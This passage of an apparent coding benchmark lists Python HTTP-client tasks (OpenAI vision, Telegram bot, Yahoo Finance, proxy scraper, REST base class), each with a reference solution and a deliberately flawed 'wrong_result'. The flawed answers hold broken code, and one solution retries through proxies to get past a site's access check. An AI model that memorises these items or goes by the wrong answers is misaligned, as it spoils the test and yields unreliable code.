service_record.get(\"api_uris\", {})\n\n    def retrieve_authorization_token(self, code: str) -> str:\n        endpoint = \"token\"\n        data = {\n            \"grant_type\": \"authorization_code\",\n            \"code\": code\n        }\n        response = self._api_request(endpoint, method=\"POST\", data=data)\n        if \"access_token\" in response:\n            return response[\"access_token\"]\n        else:\n            return \"\"\n\n    def revoke_authorization(self, service_record: object) -> None:\n        endpoint = \"revoke\"\n        data = self._apiData(service_record)\n        self._api_request(endpoint, service_record, method=\"POST\", data=data)\n\n    def download_activity(self, service_record: object, activity_id: str) -> dict:\n        uris = self.get_api_uris(service_record)\n        endpoint = uris.get(\"activity_download\", \"\")\n        if not endpoint:\n            return {}\n        params = {\"activity_id\": activity_id}\n        response = self._api_request(endpoint, service_record, method=\"GET\", params=params)\n        return response\n\n    def upload_activity(self, service_record: object, upload_data: dict, uris: dict) -> str:\n        endpoint = uris.get(\"activity_upload\", \"\")\n        if not endpoint:\n            return \"\"\n        files = {\"file\": (\"activity_data.json\", upload_data)}\n        response = self._api_request(endpoint, service_record, method=\"POST\", files=files)\n        if \"upload_id\" in response:\n            return response[\"upload_id\"]\n        else:\n            return \"\""
  },
  {
    "Task_id": 113,
    "Instruction": "Task Description: Implement a Python class that interacts with OpenAI's GPT-4 Vision API to process image and text prompts, handling image encoding and API communication with retry logic.\n\nClass Description: OpenAIGPT4Vision is a client for OpenAI's GPT-4 Vision API that processes both text and image inputs. It handles image conversion to base64 format, API request construction, and response processing with built-in retry mechanisms for failed requests.\n\nAttributes:\napi_key: str - The OpenAI API key for authentication\nheaders: dict - HTTP headers including Content-Type and Authorization\nmax_new_tokens: int - Maximum number of tokens to generate in the response (default: 256)\n\nMethods:\n__init__(api_key: str, max_new_tokens: int = 256) -> None - Initializes the API client with authentication and configuration\nencode_image_to_base64(raw_image_data: PIL.Image.Image) -> str - Static method that converts PIL Image to base64 encoded string\ngenerate(text_prompt: str, raw_image_data: Union[PIL.Image.Image, dict, str]) -> str - Processes text and image input, calls the API, and returns the generated content\n_get_pil_image(raw_image_data: Union[PIL.Image.Image, dict, str]) -> PIL.Image.Image - Static helper method to convert various image formats to PIL Image object",
    "Canonical_solution": "import requests\nimport base64\nfrom PIL import Image\nimport io\nimport time\n\nclass OpenAIGPT4Vision:\n    def __init__(self, api_key: str, max_new_tokens: int = 256):\n        self.api_key = api_key\n        self.headers = {\"Content-Type\": \"application/json\", \"Authorization\": f\"Bearer {api_key}\"}\n        self.max_new_tokens = max_new_tokens\n\n    @staticmethod\n    def encode_image_to_base64(raw_image_data) -> str:\n        if isinstance(raw_image_data, Image.Image):\n            buffered = io.BytesIO()\n            raw_image_data.save(buffered, format=\"JPEG\")\n            return base64.b64encode(buffered.getvalue()).decode(\"utf-8\")\n        raise ValueError(\"The input image data must be a PIL.Image.Image\")\n\n    def generate(self, text_prompt: str, raw_image_data):\n        raw_image_data = self._get_pil_image(raw_image_data).convert(\"RGB\")\n        base64_image = self.encode_image_to_base64(raw_image_data)\n\n        payload = {\n            \"model\": \"gpt-4-vision-preview\",\n            \"messages\": [\n                {\n                    \"role\": \"user\",\n                    \"content\": [\n                        {\"type\": \"text\", \"text\": text_prompt},\n                        {\"type\": \"image_url\", \"image_url\": {\"url\": f\"data:image/jpeg;base64,{base64_image}\"}},\n                    ],\n                }\n            ],\n            \"max_tokens\": self.max_new_tokens,\n        }\n\n        retry = True\n        retry_times = 0\n        while retry and retry_times < 5:\n            response = requests.post(\"https://api.openai.com/v1/chat/completions\", headers=self.headers, json=payload)\n            if response.status_code == 200:\n                response_data = response.json()\n                return response_data[\"choices\"][0][\"message\"][\"content\"]\n            else:\n                print(f\"Failed to connect to OpenAI API: {response.status_code} - {response.text}. Retrying...\")\n                time.sleep(10)\n                retry_times += 1\n        return \"Failed to connect to OpenAI GPT4V API\"\n\n    @staticmethod\n    def _get_pil_image(raw_image_data) -> Image.Image:\n        if isinstance(raw_image_data, Image.Image):\n            return raw_image_data\n        elif isinstance(raw_image_data, dict) and \"bytes\" in raw_image_data:\n            return Image.open(io.BytesIO(raw_image_data[\"bytes\"]))\n        elif isinstance(raw_image_data, str):\n            image_bytes = base64.b64decode(raw_image_data)\n            return Image.open(io.BytesIO(image_bytes))\n        else:\n            raise ValueError(\"Unsupported image data format\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import base64\nfrom PIL import Image\nimport requests\nfrom typing import Union, Dict, Optional\nimport time\nimport logging\n\nclass OpenAIGPT4Vision:\n    API_URL = \"https://api.openai.com/v1/images/generations\"\n    MAX_RETRIES = 3\n    RETRY_DELAY = 2\n\n    def __init__(self, api_key: str, max_new_tokens: int = 256):\n        self.api_key = api_key\n        self.headers = {\n            \"Content-Type\": \"application/json\",\n            \"Authorization\": f\"Bearer {self.api_key}\"\n        }\n        self.max_new_tokens = max_new_tokens\n        self.logger = logging.getLogger(__name__)\n\n    @staticmethod\n    def encode_image_to_base64(raw_image_data: Image.Image) -> str:\n        img_byte_arr = BytesIO()\n        raw_image_data.save(img_byte_arr, format='PNG')\n        encoded_image = base64.b64encode(img_byte_arr.getvalue()).decode('utf-8')\n        return encoded_image\n\n    @staticmethod\n    def _get_pil_image(raw_image_data: Union[Image.Image, dict, str]) -> Image.Image:\n        if isinstance(raw_image_data, Image.Image):\n            return raw_image_data\n        elif isinstance(raw_image_data, dict):\n            # Assuming raw_image_data is a dictionary with 'url' key\n            response = requests.get(raw_image_data['url'])\n            image_data = response.content\n            return Image.open(BytesIO(image_data))\n        elif isinstance(raw_image_data, str):\n            # Assuming raw_image_data is a file path\n            return Image.open(raw_image_data)\n        else:\n            raise ValueError(\"Invalid image data format\")\n\n    def generate(self, text_prompt: str, raw_image_data: Union[Image.Image, dict, str]) -> str:\n        for attempt in range(self.MAX_RETRIES + 1):\n            try:\n                pil_image = OpenAIGPT4Vision._get_pil_image(raw_image_data)\n                encoded_image = OpenAIGPT4Vision.encode_image_to_base64(pil_image)\n                payload = {\n                    \"model\": \"gpt-4-vision-preview\",\n                    \"prompt\": text_prompt,\n                    \"image\": encoded_image,\n                    \"max_new_tokens\": self.max_new_tokens\n                }\n                response = requests.post(self.API_URL, headers=self.headers, json=payload)\n                response.raise_for_status()\n                return response.json().get(\"generated_text\", \"\")\n            except Exception as e:\n                self.logger.error(f\"API call failed: {e}\")\n                if attempt < self.MAX_RETRIES:\n                    time.sleep(self.RETRY_DELAY)\n                else:\n                    raise e"
  },
  {
    "Task_id": 114,
    "Instruction": "Task Description: Write a Python function that downloads a schema file from a given URL and returns its local path. The function should handle cases where the file already exists locally and properly manage HTTP request failures.\n\nFunction Description: The function `download_schema_file` downloads a JSON schema file from a specified URL to a local path. It checks if the file already exists locally before attempting to download. If the download fails, it issues a warning and exits the script. The function uses the `requests` library for HTTP operations and handles file paths using `pathlib.Path`.\n\nInput: \n- `envs` (Dict[str, Any]): A dictionary containing environment variables with the following keys:\n  - `SIGMA_SCHEMA_FILE`: Optional local path for the schema file. If not provided, defaults to \"sigma-schema.json\" in the workspace.\n  - `SIGMA_SCHEMA_URL`: URL from which to download the schema file.\n  - `GITHUB_WORKSPACE`: Base directory path for resolving relative file paths.\n\nOutput: \n- `Path | NoReturn`: Returns the absolute path to the downloaded schema file if successful. If the download fails, the function exits the script with status code -1.",
    "Canonical_solution": "import os\nimport requests\nimport warnings\nfrom pathlib import Path\nfrom typing import Any, Dict, NoReturn\n\ndef download_schema_file(envs: Dict[str, Any]) -> Path | NoReturn:\n    \"\"\"Download the schema file from the given URL and return its path.\n\n    Args:\n        envs (Dict[str, Any]): A dictionary containing the environment variables\n            used by the action.\n\n    Returns:\n        Path | NoReturn: Path to the schema file or exit the script if\n            the file could not be downloaded.\n    \"\"\"\n\n    schema_file = envs[\"SIGMA_SCHEMA_FILE\"]\n    schema_url = envs[\"SIGMA_SCHEMA_URL\"]\n    if not schema_file:\n        schema_file = envs[\"GITHUB_WORKSPACE\"] / \"sigma-schema.json\"\n    else:\n        schema_file = Path(schema_file)\n        if not schema_file.exists():\n            schema_file = envs[\"GITHUB_WORKSPACE\"] / schema_file\n\n    if not schema_file.exists():\n        response = requests.get(schema_url)\n        if response.status_code == 200:\n            with open(schema_file, \"wb\") as f:\n                f.write(response.content)\n        else:\n            warnings.warn(\n                f\"Failed to download schema file {schema_file}, skipping validation\"\n            )\n            os._exit(-1)\n    return (envs[\"GITHUB_WORKSPACE\"] / schema_file).absolute()",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nfrom pathlib import Path\nimport sys\n\ndef download_schema_file(envs):\n    schema_file_path = envs.get('SIGMA_SCHEMA_FILE')\n    if not schema_file_path:\n        workspace = Path(envs['GITHUB_WORKSPACE'])\n        schema_file_path = workspace / \"sigma-schema.json\"\n    \n    local_path = Path(schema_file_path)\n    \n    if local_path.exists():\n        return local_path\n    \n    url = envs['SIGMA_SCHEMA_URL']\n    try:\n        response = requests.get(url, timeout=10)\n        response.raise_for_status()\n        local_path.parent.mkdir(parents=True, exist_ok=True)\n        local_path.write_bytes(response.content)\n        return local_path\n    except requests.RequestException as e:\n        print(f\"Failed to download schema file: {e}\", file=sys.stderr)\n        sys.exit(-1)"
  },
  {
    "Task_id": 115,
    "Instruction": "Task Description: Create a Python function that fetches stock data from Yahoo Finance API for a given stock symbol using HTTP requests.\n\nFunction Description: The function should make an HTTP GET request to Yahoo Finance's quote API endpoint, handle potential errors, and return the stock data in a string format. It should validate the response status and structure before returning the data.\n\nInput: \n- symbol (str): The stock symbol to fetch data for (e.g., 'AAPL' for Apple Inc.)\n\nOutput: \n- str: A string representation of the stock data dictionary containing price, volume, and other relevant information from the API response\n\nRaises:\n- ValueError: If the HTTP request fails (non-200 status code) or if no data is found for the given symbol",
    "Canonical_solution": "import requests\n\ndef get_stock_data(symbol: str) -> str:\n    \"\"\"\n    Fetches stock data from Yahoo Finance for a given stock symbol.\n\n    Args:\n        symbol (str): The stock symbol to fetch data for (e.g., 'AAPL' for Apple Inc.).\n\n    Returns:\n        Dict[str, Any]: A dictionary containing stock data, including price, volume, and other relevant information.\n\n    Raises:\n        ValueError: If the stock symbol is invalid or data cannot be retrieved.\n    \"\"\"\n    url = f\"https://query1.finance.yahoo.com/v7/finance/quote?symbols={symbol}\"\n    response = requests.get(url)\n\n    if response.status_code != 200:\n        raise ValueError(f\"Error fetching data for symbol: {symbol}\")\n\n    data = response.json()\n    if (\n        \"quoteResponse\" not in data\n        or not data[\"quoteResponse\"][\"result\"]\n    ):\n        raise ValueError(f\"No data found for symbol: {symbol}\")\n\n    return str(data[\"quoteResponse\"][\"result\"][0])",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\n\ndef fetch_stock_data(symbol):\n    url = f\"https://query1.finance.yahoo.com/v7/finance/quote?symbol={symbol}\"\n    try:\n        response = requests.get(url)\n        response.raise_for_status()\n        data = response.json()\n        if data.get('error') or not data.get('quoteResponse'):\n            raise ValueError(f\"No data found for symbol {symbol}\")\n        stock_data = {\n            'price': data['quoteResponse']['result'][0]['regularMarketPrice'],\n            'volume': data['quoteResponse']['result'][0]['regularMarketVolume'],\n            'currency': data['quoteResponse']['result'][0]['currency'],\n            'exchange': data['quoteResponse']['result'][0]['exchange']\n        }\n        return str(stock_data)\n    except requests.exceptions.RequestException as e:\n        raise ValueError(f\"HTTP request failed for symbol {symbol}: {str(e)}\") from e\n    except ValueError as e:\n        raise ValueError(f\"Invalid data for symbol {symbol}: {str(e)}\") from e"
  },
  {
    "Task_id": 116,
    "Instruction": "Task Description: Create a Python class that interacts with a web API to submit crawling tasks and retrieve their results, supporting both asynchronous and synchronous operations.\n\nClass Description: The Crawl4AiTester class provides functionality to interact with a web API for submitting URL crawling tasks. It handles authentication, task submission, and result retrieval with both asynchronous (polling) and synchronous approaches.\n\nAttributes:\n- base_url: str - The base URL of the API server (default: \"http://localhost:11235\")\n- api_token: str - The authentication token for API access (can be set via environment variable)\n- headers: dict - HTTP headers including the authorization token if provided\n\nMethods:\n- __init__(base_url: str = \"http://localhost:11235\", api_token: str = None) -> None - Initializes the API client with optional base URL and API token\n- submit_and_wait(request_data: Dict[str, Any], timeout: int = 300) -> Dict[str, Any] - Submits an asynchronous crawling task and polls for results until completion or timeout\n- submit_sync(request_data: Dict[str, Any]) -> Dict[str, Any] - Submits a synchronous crawling task and returns the immediate response",
    "Canonical_solution": "import requests\nimport os\nfrom typing import Dict, Any\n\nclass Crawl4AiTester:\n    def __init__(self, base_url: str = \"http://localhost:11235\", api_token: str = None):\n        self.base_url = base_url\n        self.api_token = api_token or os.getenv('CRAWL4AI_API_TOKEN')\n        self.headers = {'Authorization': f'Bearer {self.api_token}'} if self.api_token else {}\n        \n    def submit_and_wait(self, request_data: Dict[str, Any], timeout: int = 300) -> Dict[str, Any]:\n        response = requests.post(f\"{self.base_url}/crawl\", json=request_data, headers=self.headers)\n        if response.status_code == 403:\n            raise Exception(\"API token is invalid or missing\")\n        task_id = response.json()[\"task_id\"]\n        \n        start_time = time.time()\n        while True:\n            if time.time() - start_time > timeout:\n                raise TimeoutError(f\"Task {task_id} did not complete within {timeout} seconds\")\n                \n            result = requests.get(f\"{self.base_url}/task/{task_id}\", headers=self.headers)\n            status = result.json()\n            \n            if status[\"status\"] == \"failed\":\n                raise Exception(f\"Task failed: {status.get('error')}\")\n                \n            if status[\"status\"] == \"completed\":\n                return status\n                \n            time.sleep(2)\n            \n    def submit_sync(self, request_data: Dict[str, Any]) -> Dict[str, Any]:\n        response = requests.post(f\"{self.base_url}/crawl_sync\", json=request_data, headers=self.headers, timeout=60)\n        if response.status_code == 408:\n            raise TimeoutError(\"Task did not complete within server timeout\")\n        response.raise_for_status()\n        return response.json()",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nimport time\nfrom typing import Dict, Any, Optional\n\nclass Crawl4AiTester:\n    def __init__(self, base_url: str = \"http://localhost:11235\", api_token: str = None) -> None:\n        self.base_url = base_url\n        self.api_token = api_token\n        self.headers = {\n            \"Authorization\": f\"Bearer {self.api_token}\" if self.api_token else \"\"\n        }\n\n    def submit_and_wait(self, request_data: Dict[str, Any], timeout: int = 300) -> Dict[str, Any]:\n        submit_url = f\"{self.base_url}/submit\"\n        response = requests.post(submit_url, json=request_data, headers=self.headers)\n        response.raise_for_status()\n        task_id = response.json().get(\"task_id\")\n\n        if not task_id:\n            raise ValueError(\"Task ID not found in response\")\n\n        poll_url = f\"{self.base_url}/poll/{task_id}\"\n        start_time = time.time()\n\n        while True:\n            response = requests.get(poll_url, headers=self.headers)\n            response.raise_for_status()\n            result = response.json()\n\n            if result.get(\"status\") == \"completed\":\n                return result\n            if result.get(\"status\") == \"failed\":\n                raise Exception(f\"Task failed: {result.get('error')}\")\n            if time.time() - start_time > timeout:\n                raise TimeoutError(\"Timeout exceeded while waiting for task completion\")\n            time.sleep(1)\n\n    def submit_sync(self, request_data: Dict[str, Any]) -> Dict[str, Any]:\n        submit_url = f\"{self.base_url}/submit\"\n        response = requests.post(submit_url, json=request_data, headers=self.headers)\n        response.raise_for_status()\n        return response.json()"
  },
  {
    "Task_id": 117,
    "Instruction": "Task Description: Implement a Python class that serves as a client for interacting with the Telegram Bot API, enabling message and file sending functionality.\n\nClass Description: The TelegramClient class provides methods to send messages and files to a specified Telegram chat using the Telegram Bot API. It handles HTTP requests and responses, including error logging.\n\nAttributes:\n- chat_id: [Union[int, str]] - The unique identifier for the target chat or username of the target channel (in format @channelusername)\n- thread_id: [int] - The unique identifier for the target message thread (topic) in a forum-style chat\n- bot_token: [str] - The authentication token for the Telegram bot\n\nMethods:\n- send_message(message: str, disable_links_preview: bool = True) -> None - Sends a text message to the specified chat. Uses Markdown formatting by default and can disable web page previews.\n  Input:\n    - message: [str] - The text message to be sent\n    - disable_links_preview: [bool] - Whether to disable web page previews for links in the message (default: True)\n  Output: None (logs errors if request fails)\n\n- send_file(file_name: str, contents: bytes) -> None - Sends a file to the specified chat, automatically handling different file types (photos vs documents) and converting SVG to PNG if needed.\n  Input:\n    - file_name: [str] - The name of the file to be sent\n    - contents: [bytes] - The binary content of the file\n  Output: None (logs errors if request fails)",
    "Canonical_solution": "import logging\nimport os\nfrom typing import Union\nimport requests\n\nTELEGRAM_BASE_URL = os.environ.get(\"TELEGRAM_BASE_URL\", \"https://api.telegram.org\")\n\nclass TelegramClient:\n    def __init__(self, chat_id: Union[int, str], thread_id: int, bot_token: str):\n        self.chat_id = int(chat_id)\n        self.thread_id = thread_id\n        self.bot_token = bot_token\n\n    def send_message(self, message: str, disable_links_preview: bool = True):\n        url = f\"{TELEGRAM_BASE_URL}/bot{self.bot_token}/sendMessage\"\n        message_json = {\n            \"chat_id\": self.chat_id,\n            \"message_thread_id\": self.thread_id,\n            \"disable_web_page_preview\": disable_links_preview,\n            \"parse_mode\": \"Markdown\",\n            \"text\": message,\n        }\n        response = requests.post(url, json=message_json)\n\n        if response.status_code != 200:\n            logging.error(\n                f\"Failed to send telegram message: chat_id - {self.chat_id} reason - {response.reason} {response.text}\"\n            )\n\n    def send_file(self, file_name: str, contents: bytes):\n        file_type = \"Photo\" if is_image(file_name) else \"Document\"\n        url = f\"{TELEGRAM_BASE_URL}/bot{self.bot_token}/send{file_type}?chat_id={self.chat_id}\"\n        if file_name.endswith(SVG_SUFFIX):\n            contents = convert_svg_to_png(contents)\n            file_name = file_name.replace(SVG_SUFFIX, PNG_SUFFIX)\n\n        files = {file_type.lower(): (file_name, contents)}\n        response = requests.post(url, files=files)\n\n        if response.status_code != 200:\n            logging.error(\n                f\"Failed to send telegram file: chat_id - {self.chat_id} reason - {response.reason} {response.text}\"\n            )",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nimport logging\nfrom typing import Union, Optional\n\nlogging.basicConfig(level=logging.ERROR)\n\nclass TelegramClient:\n    def __init__(self, chat_id: Union[int, str], bot_token: str, thread_id: int = 0):\n        self.chat_id = chat_id\n        self.bot_token = bot_token\n        self.thread_id = thread_id\n\n    def send_message(self, message: str, disable_links_preview: bool = True) -> None:\n        url = f\"https://api.telegram.org/bot{self.bot_token}/sendMessage\"\n        params = {\n            \"chat_id\": self.chat_id,\n            \"text\": message,\n            \"disable_web_page_preview\": disable_links_preview,\n            \"parse_mode\": \"Markdown\",\n            \"reply_to_message_id\": self.thread_id\n        }\n        try:\n            response = requests.post(url, params=params)\n            response.raise_for_status()\n        except requests.exceptions.RequestException as e:\n            logging.error(f\"Failed to send message: {e}\")\n\n    def send_file(self, file_name: str, contents: bytes) -> None:\n        url = f\"https://api.telegram.org/bot{self.bot_token}/sendDocument\"\n        files = {\"document\": (file_name, contents)}\n        params = {\n            \"chat_id\": self.chat_id,\n            \"thread_id\": self.thread_id\n        }\n        try:\n            response = requests.post(url, files=files, params=params)\n            response.raise_for_status()\n        except requests.exceptions.RequestException as e:\n            logging.error(f\"Failed to send file: {e}\")"
  },
  {
    "Task_id": 118,
    "Instruction": "Task Description: Create a Python class that implements HTTP client functionality with proxy support and retry mechanism for handling web requests.\n\nClass Description: The HTTPClient class provides methods for making HTTP GET and POST requests with configurable headers, proxy settings, and automatic retry on failure. It includes features like user-agent rotation and basic response validation.\n\nAttributes:\n- ua: [UserAgent] - Instance for generating random user-agent strings\n- proxyHost: [str] - Proxy server host address\n- proxyPort: [str] - Proxy server port number\n- proxyUser: [str] - Proxy authentication username\n- proxyPass: [str] - Proxy authentication password\n- proxies: [dict] - Configured proxy settings dictionary for HTTP/HTTPS\n\nMethods:\n- get_request(url, headers=None, params=None, timeout=4) -> [requests.Response or None] - Sends HTTP GET request to specified URL with optional headers and query parameters. Returns response if successful (status code 200 and no validation text), otherwise None after retries.\n- post_request(url, data=None, headers=None, timeout=4) -> [requests.Response or None] - Sends HTTP POST request to specified URL with optional data and headers. Returns response if successful (status code 200 and no validation text), otherwise None after retries.",
    "Canonical_solution": "import csv\nimport os\nimport re\nimport warnings\nimport requests\nfrom fake_useragent import UserAgent\nfrom scrapy import Selector\n\nclass HTTPClient:\n    def __init__(self):\n        self.ua = UserAgent()\n        self.proxyHost = \"http-dyn.abuyun.com\"\n        self.proxyPort = \"9020\"\n        self.proxyUser = \"\"\n        self.proxyPass = \"\"\n        \n        proxyMeta = \"http://%(user)s:%(pass)s@%(host)s:%(port)s\" % {\n            \"host\": self.proxyHost,\n            \"port\": self.proxyPort,\n            \"user\": self.proxyUser,\n            \"pass\": self.proxyPass,\n        }\n\n        self.proxies = {\n            \"http\": proxyMeta,\n            \"https\": proxyMeta,\n        }\n\n    def get_request(self, url, headers=None, params=None, timeout=4):\n        if headers is None:\n            headers = {\n                'sec-fetch-dest': 'document',\n                'sec-fetch-mode': 'navigate',\n                'sec-fetch-site': 'none',\n                'sec-fetch-user': '?1',\n                'upgrade-insecure-requests': '1',\n                'user-agent': self.ua.chrome\n            }\n            \n        request_count = 0\n        while request_count < 15:\n            try:\n                response = requests.get(url, headers=headers, proxies=self.proxies, params=params, timeout=timeout)\n                if response.status_code == 200 and ('\u8bbf\u95ee\u9a8c\u8bc1' not in response.text):\n                    return response\n                request_count += 1\n            except:\n                request_count += 1\n        return None\n\n    def post_request(self, url, data=None, headers=None, timeout=4):\n        if headers is None:\n            headers = {\n                'sec-fetch-dest': 'document',\n                'sec-fetch-mode': 'navigate',\n                'sec-fetch-site': 'none',\n                'sec-fetch-user': '?1',\n                'upgrade-insecure-requests': '1',\n                'user-agent': self.ua.chrome\n            }\n            \n        request_count = 0\n        while request_count < 15:\n            try:\n                response = requests.post(url, data=data, headers=headers, proxies=self.proxies, timeout=timeout)\n                if response.status_code == 200 and ('\u8bbf\u95ee\u9a8c\u8bc1' not in response.text):\n                    return response\n                request_count += 1\n            except:\n                request_count += 1\n        return None",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nfrom requests.adapters import HTTPAdapter\nfrom urllib3.util.retry import Retry\nimport random\n\nclass UserAgent:\n    def __init__(self, user_agents):\n        self.user_agents = user_agents\n\n    def get_random_user_agent(self):\n        return random.choice(self.user_agents)\n\nclass HTTPClient:\n    def __init__(self, user_agents, proxy_host=None, proxy_port=None, proxy_user=None, proxy_pass=None):\n        self.ua = UserAgent(user_agents)\n        self.proxyHost = proxy_host\n        self.proxyPort = proxy_port\n        self.proxyUser = proxy_user\n        self.proxyPass = proxy_pass\n        self.proxies = {}\n        if self.proxyHost and self.proxyPort:\n            self.proxies = {\n                'http': f'http://{self.proxyUser}:{self.proxyPass}@{self.proxyHost}:{self.proxyPort}',\n                'https': f'https://{self.proxyUser}:{self.proxyPass}@{self.proxyHost}:{self.proxyPort}'\n            }\n\n    def get_request(self, url, headers=None, params=None, timeout=4):\n        headers = headers or {}\n        headers['User-Agent'] = self.ua.get_random_user_agent()\n        session = requests.Session()\n        retries = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])\n        adapter = HTTPAdapter(max_retries=retries)\n        session.mount('http://', adapter)\n        session.mount('https://', adapter)\n        try:\n            response = session.get(url, headers=headers, params=params, timeout=timeout, proxies=self.proxies)\n            if response.status_code == 200 and 'validation text' not in response.text:\n                return response\n            return None\n        except Exception as e:\n            return None\n\n    def post_request(self, url, data=None, headers=None, timeout=4):\n        headers = headers or {}\n        headers['User-Agent'] = self.ua.get_random_user_agent()\n        session = requests.Session()\n        retries = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])\n        adapter = HTTPAdapter(max_retries=retries)\n        session.mount('http://', adapter)\n        session.mount('https://', adapter)\n        try:\n            response = session.post(url, data=data, headers=headers, timeout=timeout, proxies=self.proxies)\n            if response.status_code == 200 and 'validation text' not in response.text:\n                return response\n            return None\n        except Exception as e:\n            return None"
  },
  {
    "Task_id": 119,
    "Instruction": "Task Description: Create a Python class that serves as a base HTTP client for interacting with a RESTful API, handling various types of API calls (GET, POST, PUT, DELETE) with proper error handling and logging.\n\nClass Description: SXTBaseAPI is a base class that provides HTTP client functionality for making API calls to a specified endpoint. It handles authentication, request construction, response processing, and error handling. The class supports configurable API versions, network call simulation, and comprehensive logging.\n\nAttributes:\n- api_url: str - Base URL for the API endpoint (default: 'https://api.spaceandtime.app')\n- access_token: str - Authentication token for API access\n- logger: logging.Logger - Logger instance for recording API call information\n- network_calls_enabled: bool - Flag to enable/disable actual network calls (default: True)\n- standard_headers: dict - Default headers for API requests\n- versions: dict - Dictionary mapping API endpoints to their versions\n- APICALLTYPE: Enum - Reference to SXTApiCallTypes enum for request types\n\nMethods:\n- __init__(access_token: str = '', logger: logging.Logger = None) -> None - Initializes the API client with optional access token and logger\n- call_api(endpoint: str, auth_header: bool = True, request_type: str = SXTApiCallTypes.POST, header_parms: dict = {}, data_parms: dict = {}, query_parms: dict = {}, path_parms: dict = {}) -> tuple[bool, dict] - Makes an API call with specified parameters and returns success status with response data\n- __fakedata__(endpoint: str) -> Union[list, dict] - Generates mock data when network calls are disabled (for testing purposes)",
    "Canonical_solution": "import requests\nimport json\nimport logging\nfrom pathlib import Path\nfrom .sxtenums import SXTApiCallTypes\nfrom .sxtexceptions import SxTArgumentError, SxTAPINotDefinedError\nfrom .sxtbiscuits import SXTBiscuit\n\nclass SXTBaseAPI:\n    api_url = 'https://api.spaceandtime.app'\n    access_token = ''\n    logger: logging.Logger\n    network_calls_enabled: bool = True\n    standard_headers = {\n        \"accept\": \"application/json\",\n        \"content-type\": \"application/json\"\n    }\n    versions = {}\n    APICALLTYPE = SXTApiCallTypes\n\n    def __init__(self, access_token: str = '', logger: logging.Logger = None) -> None:\n        if logger:\n            self.logger = logger\n        else:\n            self.logger = logging.getLogger()\n            self.logger.setLevel(logging.INFO)\n            if len(self.logger.handlers) == 0:\n                self.logger.addHandler(logging.StreamHandler())\n\n        apiversionfile = Path(Path(__file__).resolve().parent / 'apiversions.json')\n        self.access_token = access_token\n        with open(apiversionfile, 'r') as fh:\n            content = fh.read()\n        self.versions = json.loads(content)\n\n    def call_api(self, endpoint: str,\n                 auth_header: bool = True,\n                 request_type: str = SXTApiCallTypes.POST,\n                 header_parms: dict = {},\n                 data_parms: dict = {},\n                 query_parms: dict = {},\n                 path_parms: dict = {}):\n        txt = 'response.text not available - are you sure you have the correct API Endpoint?'\n        statuscode = 555\n        response = {}\n\n        if not self.network_calls_enabled: return True, self.__fakedata__(endpoint)\n\n        def __handle_errors__(txt, ex, statuscode, responseobject, loggerobject):\n            loggerobject.error(txt)\n            rtn = {'text': txt}\n            rtn['error'] = str(ex)\n            rtn['status_code'] = statuscode\n            rtn['response_object'] = responseobject\n            return False, rtn\n\n        try:\n            if endpoint not in self.versions.keys():\n                raise SxTAPINotDefinedError(\"Endpoint not defined in API Lookup (apiversions.json). Please reach out to Space and Time for assistance. \\nAs a work-around, you can try manually adding the endpoint to the SXTBaseAPI.versions dictionary.\")\n            version = self.versions[endpoint]\n            self.logger.debug(f'API Call started for endpoint: {version}/{endpoint}')\n\n            if request_type not in SXTApiCallTypes:\n                msg = f'request_type must be of type SXTApiCallTypes, not { type(request_type) }'\n                raise SxTArgumentError(msg, logger=self.logger)\n\n            for name, value in path_parms.items():\n                endpoint = endpoint.replace(f'{{{name}}}', value)\n\n            if query_parms != {}:\n                endpoint = f'{endpoint}?' + '&'.join([f'{n}={v}' for n, v in query_parms.items()])\n\n            headers = {k: v for k, v in self.standard_headers.items()}\n            if auth_header: headers['authorization'] = f'Bearer {self.access_token}'\n            headers.update(header_parms)\n\n            url = f'{self.api_url}/{version}/{endpoint}'\n\n            match request_type:\n                case SXTApiCallTypes.POST: callfunc = requests.post\n                case SXTApiCallTypes.GET: callfunc = requests.get\n                case SXTApiCallTypes.PUT: callfunc = requests.put\n                case SXTApiCallTypes.DELETE: callfunc = requests.delete\n                case _: raise SxTArgumentError('Call type must be SXTApiCallTypes enum.', logger=self.logger)\n\n            response = callfunc(url=url, data=json.dumps(data_parms), headers=headers)\n            txt = response.text\n            statuscode = response.status_code\n            response.raise_for_status()\n\n            try:\n                self.logger.debug('API return content type: ' + response.headers.get('content-type', ''))\n                rtn = response.json()\n            except json.decoder.JSONDecodeError as ex:\n                rtn = {'text': txt, 'status_code': statuscode}\n\n            self.logger.debug(f'API call completed for endpoint: \"{endpoint}\" with result: {txt}')\n            return True, rtn\n\n        except requests.exceptions.RequestException as ex:\n            return __handle_errors__(txt, ex, statuscode, response, self.logger)\n        except SxTAPINotDefinedError as ex:\n            return __handle_errors__(txt, ex, statuscode, response, self.logger)\n        except Exception as ex:\n            return __handle_errors__(txt, ex, statuscode, response, self.logger)\n\n    def __fakedata__(self, endpoint: str):\n        if endpoint in ['sql', 'sql/dql']:\n            rtn = [{'id': '1', 'str': 'a', 'this_record': 'is a test'}]\n            rtn.append({'id': '2', 'str': 'b', 'this_record': 'is a test'})\n            rtn.append({'id': '3', 'str': 'c', 'this_record': 'is a test'})\n            return rtn\n        else:\n            return {'authCode': '469867d9660b67f8aa12b2',\n                    'accessToken': 